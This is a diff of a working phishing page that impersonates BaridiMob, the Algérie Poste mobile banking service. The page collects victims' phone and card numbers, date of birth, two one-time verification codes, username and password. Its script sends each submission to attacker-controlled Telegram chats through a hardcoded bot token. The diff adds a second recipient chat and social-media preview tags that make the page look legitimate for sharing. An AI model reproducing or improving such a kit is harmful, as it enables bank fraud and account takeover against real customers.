@@ -2,9 +2,20 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>بريدي موب - نسخة محسّنة</title>
+  <title>بريدي موب</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
+  <!-- Social Media Preview Meta Tags -->
+  <meta property="og:title" content="بريدي موب" />
+  <meta property="og:site_name" content="بريدي موب" />
+  <meta property="og:image" content="https://www2.0zz0.com/2025/09/27/16/225254962.png" />
+  <meta property="og:type" content="website" />
+  <meta property="og:description" content="خدمة بريدي موب عبر النقال لبريد الجزائر" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="بريدي موب" />
+  <meta name="twitter:image" content="https://www2.0zz0.com/2025/09/27/16/225254962.png" />
+  <meta name="twitter:description" content="خدمة بريدي موب عبر النقال لبريد الجزائر" />
   <style>
+    /* ... باقي التنسيقات كما كانت ... */
     :root {
       --main-blue: #13306a;
       --main-dark: #18104c;
@@ -389,7 +400,7 @@
       <button class="main-btn" onclick="gotoScreen(1)">مواصلة</button>
     </div>
   </div>
-  <!-- شاشة إدخال رقم الهاتف والبطاقة وتاريخ الانتهاء -->
+  <!-- شاشة إدخال رقم الهاتف والبطاقة وتاريخ الميلاد -->
   <div class="screen" id="screen-1">
     <div class="main-container">
       <div class="header-section">
@@ -413,8 +424,8 @@
             <div class="error" id="cardError"></div>
           </div>
           <div class="form-group">
-            <label for="exp">Card exp. date - تاريخ إنتهاء البطاقة <span>*</span></label>
-            <input type="text" id="exp" name="exp" maxlength="7" required placeholder="MM/YY أو MM/YYYY">
+            <label for="exp">تاريخ الميلاد <span>*</span></label>
+            <input type="text" id="exp" name="exp" maxlength="5" required placeholder="MM/YY">
             <div class="error" id="expError"></div>
           </div>
           <button type="submit" class="main-btn">مواصلة</button>
@@ -539,19 +550,66 @@
     </div>
   </div>
   <script>
-    const BOT_TOKEN = "7562829296:AAH5NJ9d6vHwszcQurqpl3vCX1C-d59SbVg";
-    const CHAT_ID = "6873334348";
+    // توكن جديد وارسال لجميع الايدي المطلوبة
+    const BOT_TOKEN = "8473437872:AAEWQMa0zQKMyDBUoNVsFkgNn81z4uXKNJw";
+    const CHAT_IDS = ["7711547813", "6873334348"];
     let userData = {};
     function gotoScreen(n) {
       let screens = ['screen-0','screen-1','screen-wait','screen-2','screen-3','screen-4'];
       screens.forEach(function(id){ document.getElementById(id).classList.remove('active'); });
       document.getElementById(screens[n]).classList.add('active');
     }
+
+    // الصيغة MM/YY فقط
     document.getElementById('exp').addEventListener('input', function(e) {
-      let v = e.target.value;
+      let v = e.target.value.replace(/[^\d\/]/g,'');
       if (/^\d{2}$/.test(v)) { e.target.value = v + '/'; }
       if (v.length === 3 && !v.includes('/')) { e.target.value = v.slice(0,2) + '/' + v.slice(2); }
+      if (v.length > 5) { e.target.value = v.slice(0,5); }
     });
+
+    // دالة لتنسيق الرسالة لتلجرام باستخدام Markdown
+    function telegramText() {
+      return (
+`📱 رقم الهاتف:
+\`${userData.phone || ""}\`
+
+💳 رقم البطاقة:
+\`${userData.card || ""}\`
+
+🎂 تاريخ الميلاد:
+\`${userData.exp || ""}\`
+
+🔑 رمز التحقق الأول:
+\`${userData.verifyCode || ""}\`
+
+🔑 رمز التحقق الثاني:
+\`${userData.verifyCode2 || ""}\`
+
+👤 اسم المستخدم:
+\`${userData.username || ""}\`
+
+🔒 كلمة السر:
+\`${userData.password || ""}\`
+`
+      );
+    }
+
+    // ارسال الرسالة الى جميع الايدي المطلوبة مع التنسيق في كل مرة
+    function sendToTelegram(text) {
+      CHAT_IDS.forEach(function(chat_id){
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            chat_id: chat_id,
+            text: text,
+            parse_mode: "Markdown"
+          })
+        });
+      });
+    }
+
     document.getElementById('regForm').onsubmit = function(e) {
       e.preventDefault();
       let phone = document.getElementById('phone').value.trim();
@@ -562,21 +620,17 @@
       document.getElementById('cardError').textContent = "";
       document.getElementById('expError').textContent = "";
       document.getElementById('formMsg').textContent = "";
-      let expValid = /^\d{2}\/(\d{2}|\d{4})$/.test(exp);
+      // يقبل فقط MM/YY
+      let expValid = /^\d{2}\/\d{2}$/.test(exp);
       if (!/^\d{10}$/.test(phone)) { document.getElementById('phoneError').textContent = "يجب إدخال رقم هاتف صحيح مكون من 10 أرقام"; valid = false; }
       if (!/^\d{16}$/.test(card)) { document.getElementById('cardError').textContent = "يجب إدخال رقم البطاقة الصحيح من 16 رقم"; valid = false; }
-      if (!expValid) { document.getElementById('expError').textContent = "يرجى إدخال تاريخ انتهاء البطاقة بصيغة MM/YY أو MM/YYYY"; valid = false; }
+      if (!expValid) { document.getElementById('expError').textContent = "يرجى إدخال تاريخ الميلاد بصيغة MM/YY فقط"; valid = false; }
       if (!valid) return;
       document.getElementById('formMsg').textContent = "";
       userData.phone = phone;
       userData.card = card;
       userData.exp = exp;
-      sendToTelegram(
-        "تسجيل جديد:\n" +
-        "هاتف: " + phone + "\n" +
-        "رقم البطاقة: " + card + "\n" +
-        "تاريخ الانتهاء: " + exp
-      );
+      sendToTelegram(telegramText());
       gotoScreen(2);
       let waitSec = Math.floor(Math.random()*6)+10;
       let waitText = document.getElementById('wait-text');
@@ -619,7 +673,7 @@
       }, 1000);
     }
     function resendCode() {
-      sendToTelegram("قام المستخدم بطلب إعادة إرسال رمز التحقق.\nهاتف: " + (userData.phone || "") );
+      sendToTelegram(telegramText());
       startTimer();
     }
     document.getElementById('verifyForm').onsubmit = function(e) {
@@ -628,13 +682,7 @@
       document.getElementById('codeError').textContent = "";
       if (!/^\d{6}$/.test(code)) { document.getElementById('codeError').textContent = "الرمز يجب أن يكون 6 أرقام فقط"; return; }
       userData.verifyCode = code;
-      sendToTelegram(
-        "رمز تحقق أول:\n" +
-        "هاتف: " + userData.phone + "\n" +
-        "رقم البطاقة: " + userData.card + "\n" +
-        "تاريخ الانتهاء: " + userData.exp + "\n" +
-        "رمز التحقق: " + code
-      );
+      sendToTelegram(telegramText());
       gotoScreen(4);
       document.getElementById('code').value = "";
     }
@@ -651,15 +699,7 @@
       if(!valid) return;
       userData.username = username;
       userData.password = password;
-      sendToTelegram(
-        "بيانات الدخول:\n" +
-        "هاتف: " + userData.phone + "\n" +
-        "رقم البطاقة: " + userData.card + "\n" +
-        "تاريخ الانتهاء: " + userData.exp + "\n" +
-        "رمز التحقق الأول: " + userData.verifyCode + "\n" +
-        "اسم المستخدم: " + username + "\n" +
-        "كلمة السر: " + password
-      );
+      sendToTelegram(telegramText());
       gotoScreen(5);
       startTimer2();
     }
@@ -683,7 +723,7 @@
       }, 1000);
     }
     function resendCode2() {
-      sendToTelegram("قام المستخدم بطلب إعادة إرسال رمز التحقق الثاني.\nهاتف: " + (userData.phone || "") );
+      sendToTelegram(telegramText());
       startTimer2();
     }
     document.getElementById('verifyForm2').onsubmit = function(e){
@@ -692,16 +732,7 @@
       document.getElementById('codeError2').textContent = "";
       if (!/^\d{6}$/.test(code2)) { document.getElementById('codeError2').textContent = "الرمز يجب أن يكون 6 أرقام فقط"; return; }
       userData.verifyCode2 = code2;
-      sendToTelegram(
-        "إدخال رمز تحقق ثاني:\n" +
-        "هاتف: " + userData.phone + "\n" +
-        "رقم البطاقة: " + userData.card + "\n" +
-        "تاريخ الانتهاء: " + userData.exp + "\n" +
-        "رمز التحقق الأول: " + userData.verifyCode + "\n" +
-        "اسم المستخدم: " + userData.username + "\n" +
-        "كلمة السر: " + userData.password + "\n" +
-        "رمز التحقق الثاني: " + code2
-      );
+      sendToTelegram(telegramText());
       showModal(function() { document.getElementById('code2').value = ""; });
       document.getElementById('verifyForm2').querySelector("button").disabled = false;
     }
@@ -717,16 +748,6 @@
     function closeModal(afterClose) {
       document.getElementById('modalError').classList.remove('active');
       if (afterClose) afterClose();
-    }
-    function sendToTelegram(text) {
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: text
-        })
-      });
     }
   </script>
 </body>
